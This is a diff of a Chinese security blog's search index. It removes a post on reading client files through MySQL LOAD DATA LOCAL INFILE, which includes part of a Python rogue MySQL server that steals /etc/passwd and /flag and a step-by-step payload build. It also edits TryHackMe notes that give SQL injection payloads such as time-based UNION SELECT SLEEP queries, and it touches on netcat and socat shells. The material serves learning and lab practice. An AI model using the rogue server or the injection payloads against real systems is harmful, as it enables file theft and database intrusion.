socket.SOCK_STREAM)<br>s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>s.bind((HOST, PORT))<br>s.listen(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    conn, addr = s.accept()<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Connection from:&#x27;</span>, addr<br>    conn.send(greeting)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        data = conn.recv(BUFFER_SIZE)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot; &quot;</span>.join(<span class="hljs-string">&quot;%02x&quot;</span> % <span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data)<br>        conn.send(authok)<br>        data = conn.recv(BUFFER_SIZE)<br>        conn.send(payload)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;[*] Payload send!&quot;</span><br>        data = conn.recv(BUFFER_SIZE)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data: <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Data received:&quot;</span>, data<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-comment"># Don&#x27;t leave the connection open.</span><br>    conn.close()<br></code></pre></td></tr></table></figure>
-
-<p>在服务器运行以上脚本，并在客户端连接</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110204759923.png" alt="image-20230110204759923"></p>
-<p>收到 <code>/etc/passwd</code> 文件内容</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110204817226.png" alt="image-20230110204817226"></p>
-<h4 id="读取-x2fflag"><a href="#读取-x2F-flag" class="headerlink" title="读取 &#x2F;flag"></a>读取 &#x2F;flag</h4><p>如果想要读取 <code>/flag</code> 如何修改 payload 呢？这是一个很简单的问题，因为已知了这是一个 <a href="https://dev.mysql.com/doc/dev/mysql-server/latest/page_protocol_com_query_response_local_infile_request.html">LOCAL INFILE Request</a> 数据包，所以只需要构造一下数据包首部和 payload 部分即可（保持 POC 中其余字段不变）。</p>
-<p>首部包括三个字节长的长度字段，一个字节长的序列号。</p>
-<p>payload 部分是一个字节长的包类型 0xFB 和 xx 字节长的文件名</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110210326807.png" alt="image-20230110210326807"></p>
-<p>现在真正的数据部分是<code>/flag</code>，转换成十六进制为 <code>2f666c6167</code>，其拼接上一个字节的包类型 0xFB 就凑成了 payload 部分：<code>fb 2f 66 6c 61 67</code> ，故首部中的长度字段值为 0x06。</p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110211445078.png" alt="image-20230110211445078"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110211413598.png" alt="image-20230110211413598"></p>
-<p><img src="/images/Mysql-LOAD-DATA-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/image-20230110211420481.png" alt="image-20230110211420481"></p>
-<h4 id="好用的自动化工具"><a href="#好用的自动化工具" class="headerlink" title="好用的自动化工具"></a>好用的自动化工具</h4><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p>
-<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/BOHB-yunying/p/10820453.html">MySQL服务端恶意读取客户端文件漏洞分析并使用Golang编写简易蜜罐</a></p>
-<p><a href="https://www.shuzhiduo.com/A/GBJrPoYRd0/">Mysql LOAD DATA读取客户端任意文件漏洞复现(原理分析)</a></p>
-<p><a href="https://blog.csdn.net/qq_53755216/article/details/118223185">https://blog.csdn.net/qq_53755216/article/details/118223185</a></p>
-]]></content>
-      <categories>
-        <category>任意文件读取</category>
-      </categories>
-      <tags>
-        <tag>MySQL安全</tag>
       </tags>
   </entry>
   <entry>
@@ -11569,11 +11319,12 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
       </tags>
   </entry>
   <entry>
-    <title>tryhackme渗透测试-NetWorkSecurity-PassiveReconnaissance</title>
+    <title>被动侦察</title>
     <url>/2023/02/04/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-NetWorkSecurity-PassiveReconnaissance/index.html</url>
     <content><![CDATA[<!--toc-->
 
-<p>又绕过了很多收费的房间，我预感到tryhackme的旅程或许要提前结束了。</p>
+
+
 <span id="more"></span>
 
 <h3 id="一-passive-reconnaissance-被动侦察"><a href="#一-Passive-Reconnaissance-被动侦察" class="headerlink" title="一. Passive Reconnaissance-被动侦察"></a>一. Passive Reconnaissance-被动侦察</h3><p>了解用于被动侦察的基本工具，例如 whois、nslookup 和 dig。</p>
@@ -11762,73 +11513,83 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>02 篇为数不多的免费章节</p>
 <span id="more"></span>
 
-<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h3><p>目标：了解如何检测和利用 SQL 注入漏洞</p>
-<p>SQL（结构化查询语言）注入，通常称为 SQLi，是对 Web 应用程序数据库服务器的攻击，会导致执行恶意查询。 当 Web 应用程序使用未经正确验证的用户输入与数据库通信时，攻击者有可能窃取、删除或更改私人和客户数据，并攻击 Web 应用程序的身份验证方法以获取私有信息或客户区。 这就是为什么 SQLi 不仅是最古老的 Web 应用程序漏洞之一，而且也是最具破坏性的。</p>
+<h3 id="一-前言"><a href="#一-前言" class="headerlink" title="一. 前言"></a>一. 前言</h3><p><strong>目标</strong>：了解如何检测和利用 SQL 注入漏洞</p>
+<p>SQL（结构化查询语言）注入，通常称为 SQLi，是对 Web 应用程序数据库服务器的攻击，会导致执行恶意查询。 当 Web 应用程序使用未经验证的用户输入与数据库通信时，攻击者有可能窃取、删除或更改数据，并攻击 Web 应用程序的身份验证方法以获取私有信息或客户数据。 这就是为什么 SQLi 不仅是最古老的 Web 应用程序漏洞之一，而且也是最具破坏性的。</p>
 <p>在这个房间里，您将了解什么是数据库、什么是 SQL 以及一些基本的 SQL 命令、如何检测 SQL 漏洞、如何利用 SQLi 漏洞以及作为开发人员如何保护自己免受 SQL 注入攻击。</p>
-<h3 id="二-sql注入"><a href="#二-SQL注入" class="headerlink" title="二.  SQL注入"></a>二.  SQL注入</h3><h4 id="21-什么是数据库"><a href="#2-1-什么是数据库？" class="headerlink" title="2.1 什么是数据库？"></a>2.1 什么是数据库？</h4><p>如果您不习惯使用数据库或利用它们，可能需要习惯一些新术语，所以让我们从一些关于数据库的结构和工作方式的基础知识开始。</p>
-<p><strong>什么是数据库？</strong></p>
-<p>数据库是以有组织的方式以电子方式存储数据集合的一种方式。 数据库由 DBMS 控制，DBMS 是数据库管理系统的首字母缩写，DBMS 分为关系型和非关系型两个阵营，这个房间的重点将放在关系型数据库上，您会遇到的一些常见数据库是 MySQL、Microsoft SQL Server、Access、PostgreSQL 和 SQLite。 我们将在本任务结束时解释关系数据库和非关系数据库之间的区别，但首先，学习一些术语很重要。</p>
-<p>在 DBMS 中，您可以有多个数据库，每个数据库都包含自己的一组相关数据。 例如，您可能有一个名为“商店”的数据库。 在此数据库中，您希望存储有关可供购买的产品的信息、已注册到您的在线商店的用户以及有关您收到的订单的信息。 您将使用称为表的东西将此信息单独存储在数据库中，每个表都用唯一的名称标识。 您可以在下图中看到这种结构，但您还可以看到企业如何使用其他单独的数据库来存储员工信息或客户团队。</p>
+<h3 id="二-sql注入"><a href="#二-SQL注入" class="headerlink" title="二.  SQL注入"></a>二.  SQL注入</h3><h4 id="21-什么是数据库"><a href="#2-1-什么是数据库？" class="headerlink" title="2.1 什么是数据库？"></a>2.1 什么是数据库？</h4><p>如果您不习惯使用数据库或利用它们，可能需要理解一些新术语，所以让我们从一些关于数据库的结构和工作方式的基础知识开始。</p>
+<p><strong>1. 什么是数据库？</strong></p>
+<p>数据库是以有组织的方式以电子形式存储数据集合的一种方式。 数据库由 DBMS 控制，DBMS 是数据库管理系统的首字母缩写，DBMS 分为关系型和非关系型两种，这个房间的重点将放在关系型数据库上，您会遇到的一些常见数据库是 MySQL、Microsoft SQL Server、Access、PostgreSQL 和 SQLite。 我们将在本任务结束时解释关系数据库和非关系数据库之间的区别，但首先，学习一些术语很重要。</p>
+<p>在 DBMS 中，您可以有多个数据库，每个数据库都包含自己的一组相关数据。 例如，您可能有一个名为“商店”的数据库。 在此数据库中，您希望存储有关可供购买的产品的信息、已注册到您的在线商店的用户以及有关您收到的订单的信息。 <strong>您将使用称为表的东西将此信息单独存储在数据库中，每个表都用唯一的名称标识</strong>。 您可以在下图中看到这种结构，但您还可以看到企业如何使用其他单独的数据库来存储员工信息或客户团队。</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/f31d5855476c01e8359df000da4ac79d.png" alt="img"></p>
-<p><strong>什么是表？</strong></p>
-<p>表由列和行组成，一种有用的方式是将表想象成一个网格，列从左到右穿过顶部，包含单元格的名称，行从上到下，每一行都有 实际数据。</p>
+<p><strong>2. 什么是表？</strong></p>
+<p><strong>表由列和行组成</strong>，一种有用的方式是将表想象成一个网格，列从左到右穿过顶部，包含单元格的名称，行从上到下，每一行都有 实际数据。</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/cee2844345f5ab5bc704b163797b3604.png" alt="img"></p>
 <p><strong>列：</strong></p>
-<p>每个列，更好地称为字段，每个表都有一个唯一的名称。 创建列时，您还可以设置它将包含的数据类型，常见的有整数（数字）、字符串（标准文本）或日期。 一些数据库可以包含更复杂的数据，例如包含位置信息的地理空间数据。 设置数据类型还可以确保不会存储不正确的信息，例如字符串“hello world”存储在用于日期的列中。 如果发生这种情况，数据库服务器通常会产生一条错误消息。 包含整数的列也可以启用自动递增功能； 这为每一行数据提供了一个唯一的数字，该数字随后续每一行而增长（递增），这样做会创建所谓的关键字段  <strong>key</strong> field ，关键字段对于每一行数据都必须是唯一的，可用于在 SQL 查询中查找确切的行。</p>
-<p>行：</p>
+<p>每个列（或者称为字段），每个表都有一个唯一的名称。 创建列时，您还可以设置它将包含的数据类型，常见的有整数（数字）、字符串（标准文本）或日期。 一些数据库可以包含更复杂的数据，例如包含位置信息的地理空间数据。 设置数据类型还可以确保不会存储不正确的信息，例如字符串 “hello world” 存储在用于日期的列中。 如果发生这种情况，数据库服务器通常会产生一条错误消息。 包含整数的列也可以启用自动递增功能； 这为每一行数据提供了一个唯一的数字，该数字随后续每一行而增长（递增），这样做会创建所谓的关键字段  <strong>key field</strong> ，关键字段对于每一行数据都必须是唯一的，可用于在 SQL 查询中查找确切的行。</p>
+<p><strong>行：</strong></p>
 <p>行或记录是包含各个数据行的内容。 当您向表中添加数据时，会创建新的行&#x2F;记录，而当您删除数据时，会删除行&#x2F;记录。</p>
 <p><strong>关系数据库与非关系数据库：</strong></p>
 <p>关系数据库将信息存储在表中，表之间通常共享信息，它们使用列来指定和定义所存储的数据，使用行来实际存储数据。表通常包含一个具有唯一ID(主键)的列，然后在其他表中使用该ID来引用它，并在表之间产生关系，因此称为关系数据库。</p>
 <p>另一方面，非关系数据库有时被称为 NoSQL，它是不使用表、列和行来存储数据的任何类型的数据库，不需要构造特定的数据库布局，因此每一行数据都可以包含不同的信息，这可以比关系数据库提供更多的灵活性。这种类型的一些流行数据库是 MongoDB、Cassandra和 ElasticSearch。</p>
-<p>现在您已经了解了数据库是什么，让我们学习如何使用SQL与它进行实际对话。</p>
-<h4 id="22-什么是-sql"><a href="#2-2-什么是-SQL？" class="headerlink" title="2.2 什么是 SQL？"></a>2.2 什么是 SQL？</h4><p>SQL(结构化查询语言)是一种功能丰富的用于查询数据库的语言，这些SQL查询更好的称谓为“语句”。</p>
-<p>我们将在这个任务中介绍的最简单的命令用于检索(选择)、更新、插入和删除数据。尽管有些相似，但一些数据库服务器有自己的语法和工作方式的轻微变化。所有这些例子都是基于MySQL数据库的。在学习了这些课程之后，您将能够轻松地为不同的服务器在线搜索替代语法。值得注意的是，SQL语法不区分大小写。</p>
+<p>现在您已经了解了数据库是什么，让我们学习如何使用 SQL 与它进行实际对话。</p>
+<h4 id="22-什么是-sql"><a href="#2-2-什么是-SQL？" class="headerlink" title="2.2 什么是 SQL？"></a>2.2 什么是 SQL？</h4><p>SQL(结构化查询语言)是一种功能丰富的用于查询数据库的语言，这些 SQL 查询更好的称谓为 “语句” 。</p>
+<p>我们将在这个任务中介绍的最简单的命令用于检索(选择)、更新、插入和删除数据。尽管有些相似，但一些数据库服务器有自己的语法和工作方式的轻微变化。以下所有例子都是基于MySQL 数据库的。值得注意的是，SQL 语法不区分大小写。</p>
 <p><strong>SELECT</strong></p>
-<p>我们将学习的第一个查询类型是用于从数据库检索数据的 SELECT 查询。</p>
-<p>select * from users;</p>
+<p>我们将学习的第一个查询命令是用于从数据库检索数据的 SELECT 查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204095901860.png" alt="image-20230204095901860"></p>
-<p>第一个单词SELECT告诉数据库我们想要检索一些数据，*告诉数据库我们想要从表中接收回所有列。例如，表可能包含三列(id、用户名和密码)。”from users”告诉数据库我们要从名为users的表中检索数据。最后，结尾的分号告诉数据库查询到此结束。</p>
-<p>下一个查询与上面的查询类似，但这一次，我们不再使用*返回数据库表中的所有列，而是只请求用户名和密码字段。</p>
-<p>select username,password from users;</p>
+<p>第一个单词 SELECT 告诉数据库我们想要检索一些数据，* 告诉数据库我们想要从表中接收回所有列。例如，表可能包含三列(id、用户名和密码)。”from users” 告诉数据库我们要从名为users 的表中检索数据。最后，结尾的分号告诉数据库查询到此结束。</p>
+<p>下一个查询与上面的查询类似，但这一次，我们不再使用 * 返回数据库表中的所有列，而是只请求用户名和密码字段。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select username,password from users;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204095937155.png" alt="image-20230204095937155"></p>
-<p>下面的查询与第一个查询一样，通过使用*选择器返回所有列，然后使用“LIMIT 1”子句强制数据库只返回一行数据。将查询更改为“LIMIT 1,1”将强制查询跳过第一个结果，然后“LIMIT 2,1”将跳过前两个结果，以此类推。您需要记住，第一个数字告诉数据库希望跳过多少结果，第二个数字告诉数据库要返回多少行。</p>
-<p>select * from users LIMIT 1;</p>
+<p>下面的查询与第一个查询一样，通过使用 * 选择器返回所有列，然后使用“LIMIT 1”子句强制数据库只返回一行数据。将查询更改为“LIMIT 1,1”将强制查询跳过第一个结果，然后“LIMIT 2,1”将跳过前两个结果，以此类推。您需要记住，第一个数字告诉数据库希望跳过多少结果，第二个数字告诉数据库要返回多少行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users LIMIT 1;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100010236.png" alt="image-20230204100010236"></p>
-<p>最后，我们将使用where子句;这就是我们如何通过返回与特定子句匹配的数据来精细地挑选出我们需要的确切数据:</p>
-<p>select * from users where username&#x3D;’admin’;</p>
+<p>最后，我们将使用 where 子句;这就是我们如何通过返回与特定子句匹配的数据来精细地挑选出我们需要的确切数据:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username=&#x27;admin&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100032828.png" alt="image-20230204100032828"></p>
 <p>这将只返回用户名等于 admin 的行。</p>
-<p>select * from users where username !&#x3D; ‘admin’;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username != &#x27;admin&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100056669.png" alt="image-20230204100056669"></p>
 <p>这将只返回用户名不等于 admin 的行。</p>
-<p>select * from users where username&#x3D;’admin’ or username&#x3D;’jon’;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username=&#x27;admin&#x27; or username=&#x27;jon&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100116582.png" alt="image-20230204100116582"></p>
 <p>这将只返回用户名等于 admin 或 jon 的行。</p>
-<p>select * from users where username&#x3D;’admin’ and password&#x3D;’p4ssword’;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username=&#x27;admin&#x27; and password=&#x27;p4ssword&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100134438.png" alt="image-20230204100134438"></p>
 <p>这将只返回用户名等于 admin 且密码等于 p4ssword 的行。</p>
 <p>使用 like 子句可以指定不是完全匹配的数据，而是通过选择百分号 % 表示的通配符的放置位置来指定以某些字符开头、包含或结尾的数据。</p>
-<p>select * from users where username like ‘a%’;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username like &#x27;a%&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100230949.png" alt="image-20230204100230949"></p>
 <p>这将返回用户名以字母 a 开头的所有行。</p>
-<p>select * from users where username like ‘%n’;</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from users where username like &#x27;%n&#x27;;<br></code></pre></td></tr></table></figure>
+
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100248129.png" alt="image-20230204100248129"></p>
-<p>这将返回用户名以字母n结尾的所有行。</p>
+<p>这将返回用户名以字母 n 结尾的所有行。</p>
 <figure class="highlight axapta"><table><tr><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%mi%&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100323307.png" alt="image-20230204100323307"></p>
 <p>这将返回用户名中包含字符 mi 的任何行。</p>
 <p><strong>UNION</strong></p>
-<p>UNION语句结合两个或多个SELECT语句的结果，从单个或多个表中检索数据;该查询的规则是，UNION语句必须在每个SELECT语句中检索相同数量的列，列必须具有相似的数据类型，列的顺序必须相同。这听起来可能不太清楚，所以让我们用下面的类比。假设一家公司希望为所有客户和供应商创建一个地址列表，以便发布新的目录。我们有一个表叫customers，内容如下:</p>
+<p>UNION 语句结合两个或多个 SELECT 语句的结果，从单个或多个表中检索数据;该查询的规则是：UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，列的顺序必须相同。</p>
+<p>这听起来可能不太清楚，所以让我们用下面的类比。假设一家公司希望为所有客户和供应商创建一个地址列表，以便发布新的目录。我们有一个表叫 customers，内容如下:</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100428044.png" alt="image-20230204100428044"></p>
 <p>另一个叫 suppliers 表，内容如下:</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100511507.png" alt="image-20230204100511507"></p>
 <p>使用下面的 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：</p>
-<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-type">name</span>,address,city,postcode <span class="hljs-keyword">from</span> customers <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> company,address,city,postcode <span class="hljs-keyword">from</span> suppliers;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100545937.png" alt="image-20230204100545937"></p>
 <p><strong>INSERT</strong></p>
-<p>INSERT语句告诉数据库，我们希望向表中插入一行新数据。”into users”告诉数据库我们希望将数据插入到哪个表中，”(username，password)”提供我们要为其提供数据的列，然后”values (‘bob’，’password’);”为前面指定的列提供数据。</p>
+<p>INSERT 语句告诉数据库，我们希望向表中插入一行新数据。”into users”告诉数据库我们希望将数据插入到哪个表中，”(username，password)”提供我们要为其提供数据的列，然后”values (‘bob’，’password’);”为前面指定的列提供数据。</p>
 <figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users (username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span> (<span class="hljs-string">&#x27;bob&#x27;</span>,<span class="hljs-string">&#x27;password123&#x27;</span>);<br></code></pre></td></tr></table></figure>
 
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100659457.png" alt="image-20230204100659457"></p>
@@ -11842,11 +11603,11 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">delete <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;martin&#x27;</span>;<br></code></pre></td></tr></table></figure>
 
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100839601.png" alt="image-20230204100839601"></p>
-<figure class="highlight coffeescript"><table><tr><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">delete from users;<br></code></pre></td></tr></table></figure>
 
 <p>由于查询中没有使用WHERE子句，因此将删除表中的所有数据。</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/image-20230204100916044.png" alt="image-20230204100916044"></p>
-<h4 id="23-什么是sql注入"><a href="#2-3-什么是SQL注入？" class="headerlink" title="2.3 什么是SQL注入？"></a>2.3 什么是SQL注入？</h4><p>当用户提供的数据被包含在SQL查询中时，使用SQL的web应用程序就会变成SQL注入。</p>
+<h4 id="23-什么是sql注入"><a href="#2-3-什么是SQL注入？" class="headerlink" title="2.3 什么是SQL注入？"></a>2.3 什么是SQL注入？</h4><p>当用户提供的数据被包含在 SQL 查询中时，使用 SQL 的 web 应用程序就会变成 SQL 注入。</p>
 <p>它看起来像什么?<br>以下面的场景为例，您遇到了一个在线博客，每个博客条目都有一个唯一的id号。博客条目可以设置为公共或私有，这取决于它们是否准备好公开发布。每个博客条目的URL可能看起来像这样:</p>
 <figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>website.thm/blog?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
@@ -11973,16 +11734,16 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss">admin123&#x27; <span class="hljs-built_in">UNION</span> <span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">5</span>);--<br></code></pre></td></tr></table></figure>
 
 <p>如果在响应时间中没有暂停，我们知道查询是不成功的，所以像前面的任务一样，我们添加另一列:</p>
-<figure class="highlight gauss"><table><tr><td class="code"><pre><code class="hljs gauss">admin123&#x27; <span class="hljs-built_in">UNION</span> <span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">SLEEP</span>(<span class="hljs-number">5</span>),<span class="hljs-number">2</span>;--<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">admin123&#x27; UNION SELECT SLEEP(5),2;--<br></code></pre></td></tr></table></figure>
 
 <p>这个有效负载应该产生了5秒的时间延迟，这证实了UNION语句的成功执行，并且有两列。</p>
 <p>现在可以从基于布尔的SQL注入中重复枚举过程，将SLEEP()方法添加到UNION SELECT语句中。<br>如果你正在努力寻找表名，下面的查询应该会帮助你:</p>
-<figure class="highlight n1ql"><table><tr><td class="code"><pre><code class="hljs n1ql">referrer=admin123&#x27; UNION <span class="hljs-keyword">SELECT</span> SLEEP(<span class="hljs-number">5</span>),<span class="hljs-number">2</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">database</span>() <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;u%&#x27;</span>;--<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">referrer=admin123&#x27; UNION SELECT SLEEP(5),2 where database() like &#x27;u%&#x27;;--<br></code></pre></td></tr></table></figure>
 
-<h4 id="28-out-of-band-sqli"><a href="#2-8-Out-of-Band-SQLi" class="headerlink" title="2.8 Out-of-Band SQLi"></a>2.8 Out-of-Band SQLi</h4><p>带外SQL注入并不常见，因为它要么依赖于数据库服务器上启用的特定功能，要么依赖于web应用程序的业务逻辑，后者基于SQL查询的结果进行某种外部网络调用。</p>
+<h4 id="28-out-of-band-sqli"><a href="#2-8-Out-of-Band-SQLi" class="headerlink" title="2.8 Out-of-Band SQLi"></a>2.8 Out-of-Band SQLi</h4><p>带外 SQL 注入并不常见，因为它要么依赖于数据库服务器上启用的特定功能，要么依赖于web 应用程序的业务逻辑，后者基于 SQL 查询的结果进行某种外部网络调用。</p>
 <p>带外攻击通过具有两个不同的通信通道进行分类，一个用于发起攻击，另一个用于收集结果。例如，攻击通道可以是一个web请求，而数据收集通道可以监视向您控制的服务发出的HTTP&#x2F;DNS请求。</p>
-<p>1)攻击者使用注入有效载荷向易受SQL注入攻击的网站发出请求。</p>
-<p>2)本网站对数据库进行SQL查询，该数据库也传递了黑客的有效载荷。</p>
+<p>1)攻击者使用注入 payload 向易受 SQL 注入攻击的网站发出请求。</p>
+<p>2)本网站对数据库进行 SQL 查询，该数据库也传递了黑客的 payload。</p>
 <p>3)有效载荷包含一个请求，该请求迫使一个HTTP请求返回黑客的机器，其中包含数据库中的数据。</p>
 <p><img src="/images/tryhackme%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%9502-SQL%E6%B3%A8%E5%85%A5/75103b88e95d4eda2244dbb360cba4ff.png" alt="img"></p>
 <h4 id="29-修复sql注入"><a href="#2-9-修复SQL注入" class="headerlink" title="2.9 修复SQL注入"></a>2.9 修复SQL注入</h4><p><strong>修复</strong></p>
@@ -13436,7 +13197,8 @@ if($request_method !~ ^(GET|HEAD|POST)$)&#123;
 <p>默认情况下，Netcat shell 非常不稳定（容易丢失），所以后文会介绍改进的技术。</p>
 </blockquote>
 <p><strong>Socat：</strong></p>
-<p>Socat 就像 steroids（英文原意是类固醇） 上的 netcat。它可以做所有相同的事情，甚至更多。 Socat shell 通常比开箱即用的 netcat shell 更稳定。从这个意义上说，它远远优于 netcat；但是 socat 相比于 netcat 有两个问题： </p>
+<p>Socat 就像 steroids（英文原意是类固醇） 上的 netcat。它可以做所有相同的事情，甚至更多。 Socat shell 通常比开箱即用的 netcat shell 更稳定。从这个意义上说，它远远优于 netcat。</p>
+<p>但是 socat 相比于 netcat 有两个问题： </p>
 <ul>
 <li>Socat 语法比 Netcat 难 </li>
